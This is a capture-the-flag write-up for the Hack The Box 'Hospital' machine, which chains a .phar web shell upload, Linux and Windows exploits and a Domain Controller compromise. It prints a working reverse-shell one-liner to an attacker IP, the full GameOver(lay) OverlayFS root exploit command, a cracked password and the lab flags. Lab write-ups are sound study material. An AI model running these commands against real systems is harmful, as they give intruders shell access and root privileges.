---
description: >-
  Difficulty: Hard OS: Linux & Windows (Active Directory) Attack Path: Nmap →
  Linux Web App (Upload phar shell) → GameOver(lay) CVE-2023-2640 → root (Linux)
  → dump shadow hashes → john crack drwilliams
---

# Hospital

### Overview

Hospital is a Hard hybrid AD/Linux machine featuring multiple stages. The entry point is a Linux web app allowing file uploads; we bypass extensions using .phar to get a web shell as www-data and elevate to root via the GameOver(lay) kernel exploit. From there, we crack the shadow hash of user drwilliams and log in to the Hospital Webmail client running on the Windows side. By exploiting a Ghostscript RCE vulnerability via a malicious .eps file attachment sent to drbrown, we obtain a Windows reverse shell. Finally, we retrieve Domain Controller credentials stored in a batch script to achieve Domain Administrator execution and obtain oot.txt.

### Enumeration

#### Nmap Scan

```
nmap -sV -T4 -O -F --version-light 10.10.11.241
```

![Nmap scan output - 22/tcp SSH, 53/tcp DNS, 88/tcp Kerberos, 389/tcp LDAP, 443/tcp SSL, 445/tcp SMB, 8080/tcp Linux HTTP](<../../.gitbook/assets/Unknown image (382)>)

Open ports:

| Port    | Service     | Version                                |
| ------- | ----------- | -------------------------------------- |
| 22      | SSH         | OpenSSH 9.0p1 (Ubuntu)                 |
| 53      | DNS         | Simple DNS Plus                        |
| 88      | Kerberos    | Microsoft Windows Kerberos             |
| 135/139 | RPC/NetBIOS | Microsoft Windows                      |
| 389     | LDAP        | Active Directory LDAP (hospital.htb)   |
| 443     | HTTP        | Apache httpd 2.4.56 (Win64) PHP 8.0.28 |
| 445     | SMB         | Microsoft Directory Services           |
| 3389    | RDP         | Microsoft Terminal Services            |
| 8080    | HTTP        | Apache httpd 2.4.55 (Ubuntu)           |

The target runs both a Linux container/VM (port 8080, port 22) and a Windows Domain Controller host (ports 88, 389, 443, 445).

### Linux Foothold & Privilege Escalation

#### Web Shell Upload

A web application runs on port 8080. By uploading a PHP command execution script wrapped in a .phar extension (such as the p0wny-shell interface), we bypass extension blacklists:

![p0wny shell code base64](<../../.gitbook/assets/Unknown image (383)>)

Accessing the uploaded .phar file triggers the shell:

![p0wny shell loaded on port 8080 uploads directory](<../../.gitbook/assets/Unknown image (384)>)

We verify execution as www-data:

![whoami / id showing www-data inside the Linux environment](<../../.gitbook/assets/Unknown image (385)>)

#### Upgrading Shell to Bash

We generate a standard reverse shell payload:

```
sh -i >& /dev/tcp/10.10.14.65/6565 0>&1
```

Convert it to base64:

![base64 conversion of the reverse shell command](<../../.gitbook/assets/Unknown image (386)>)

Execute it through the web shell:

![Executing base64 reverse shell command](<../../.gitbook/assets/Unknown image (387)>)

Catch the shell and upgrade it to an interactive TTY:

![Interactive listener catching bash shell](<../../.gitbook/assets/Unknown image (388)>)

Use Python to spawn a fully interactive PTY:

![TTY upgrading instructions reference](<../../.gitbook/assets/Unknown image (389)>)

Background the shell, configure terminal features, and foreground it:

![stty raw execution settings](<../../.gitbook/assets/Unknown image (390)>)

#### Linux Privilege Escalation - CVE-2023-2640

The Linux kernel version is vulnerable to the Ubuntu OverlayFS vulnerability (GameOver(lay)). We write an escalation script:



## CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation

unshare -rm sh -c "mkdir l u w m && cp /u\*/b\*/&#x70;_&#x33; l/;setcap cap\_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/_;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")' \`

![Running exploit.sh and dropping into root shell](<../../.gitbook/assets/Unknown image (391)>)

We are now oot inside the Linux subsystem. We dump /etc/shadow:

![Shadow file dumped showing drwilliams crypt hash](<../../.gitbook/assets/Unknown image (392)>)

### Windows Pivot & Active Directory Exploitation

#### Cracking drwilliams Password

Extract drwilliams hash from /etc/shadow and save it to a file dr.txt. Crack it using John:

```
john dr.txt --wordlist=rockyou.txt
```

![john running to brute force sha512crypt hash of drwilliams](<../../.gitbook/assets/Unknown image (393)>)

John cracks the hash:

![John successfully cracked drwilliams -> qwe123!@#](<../../.gitbook/assets/Unknown image (394)>)

```
drwilliams : qwe123!@#
```

### Windows Webmail Access

Navigate to the main site on port 443 (running under Windows):

![Hospital Webmail login page](<../../.gitbook/assets/Unknown image (395)>)

Log in as drwilliams with password qwe123!@#. Once logged in, there is an inbox message from drbrown@hospital.htb mentioning that the design department is accepting .eps vector images that will be processed with **GhostScript**:

![Webmail inbox - message suggesting Lucy/Darius use GhostScript to process EPS files](<../../.gitbook/assets/Unknown image (396)>)

### Ghostscript EPS Remote Code Execution

Ghostscript versions prior to 10.01.2 are vulnerable to a sandbox escape / remote code execution bug when parsing maliciously crafted Encapsulated PostScript (.eps) files.

We construct a malicious EPS file shami.eps which triggers the RCE to execute a Windows reverse shell:

![Composing email - attaching shami.eps payload](<../../.gitbook/assets/Unknown image (397)>)

Send this mail to drbrown@hospital.htb:

![Sending email with exploit attachment to drbrown](<../../.gitbook/assets/Unknown image (398)>)

The system has an automated worker that reads incoming mail and processes the attachment. Set up a listener:

```
nc -lvnp 8888
```

We receive a connection back from the Windows host as drbrown:

![nc catching connection from Windows machine as drbrown](<../../.gitbook/assets/Unknown image (399)>)

Let's locate the user flag:

![Navigating to C:\Users\drbrown\Desktop and dumping user.txt](<../../.gitbook/assets/Unknown image (400)>)

```
7719836ad2930b9319a95d6a737fb8e7
```

### Windows Privilege Escalation - Domain Admin

#### Extracting Credentials

Search drbrown's home directory. Inside the Documents folder, we find a batch script named ghostscript.bat:

![Listing C:\Users\drbrown\Documents - nc.exe and ghostscript.bat found](<../../.gitbook/assets/Unknown image (399)>)

Read the contents of the batch file:

![type ghostscript.bat output revealing securestring password and remote Domain Controller commands](<../../.gitbook/assets/Unknown image (399)>)

#### Domain Controller Execution

Using these credentials, we execute commands directly on the DC host:

```
python3 -m http.server 7777
```

Download a command shell into XAMPP's web directory on the Domain Controller (or execute directly via invoke-command):

![Downloading shell.phar as shel.php into xampp htdocs](<../../.gitbook/assets/Unknown image (401)>)

Verify the write location:

![htdocs directory layout on DC host](<../../.gitbook/assets/Unknown image (402)>)

Connect to the shell as Domain Administrator:

![Accessing shell - running whoami on dc showing domain administrator execution](<../../.gitbook/assets/Unknown image (403)>)

We have achieved SYSTEM/Domain Admin access on the Domain Controller! Navigate to the Administrator's Desktop:

![Navigating to C:\Users\Administrator and running dir](<../../.gitbook/assets/Unknown image (404)>)

Open the Desktop directory and grab the root flag:

![Dumping root.txt flag](<../../.gitbook/assets/Unknown image (405)>)

```
1e9a4d24f31c64dca3abe74575fd3bf5
```

![Hospital HTB Congratulations card - paraboy pwned Hospital](<../../.gitbook/assets/Unknown image (406)>)

Hospital has been completely rooted!

***

### Summary

| Step        | Detail                                                   |
| ----------- | -------------------------------------------------------- |
| Entry       | Linux upload form (Port 8080) bypassed using .phar       |
| Linux Root  | Exploited GameOver(lay) OverlayFS vulnerability          |
| Cracking    | Dumped /etc/shadow → Cracked drwilliams -> qwe123!@#     |
| Webmail     | Logged in to Roundcube on Port 443                       |
| Windows RCE | Sent malicious .eps to trigger Ghostscript vulnerability |
| AD Pivot    | Found drbrown credentials in ghostscript.bat             |
| DC Root     | Shell executed on DC via invoke-command → Root flag      |

***

### Key Takeaways

* Wildcard upload extension filters can often be bypassed using alternatives like .phar, .phtml, or double extensions.
* Hybrid setups (hosting Linux servers and Windows Active Directory) mean a compromise on one can leak host/domain credentials.
* Keep system software up to date: Ghostscript has a history of sandbox escape bugs when executing .eps files.
* Never store passwords as plaintext strings in batch files or scripts, especially if they run with remote administration capabilities.

***

_Machine IP: 10.10.11.241 | Platform: Hack The Box_
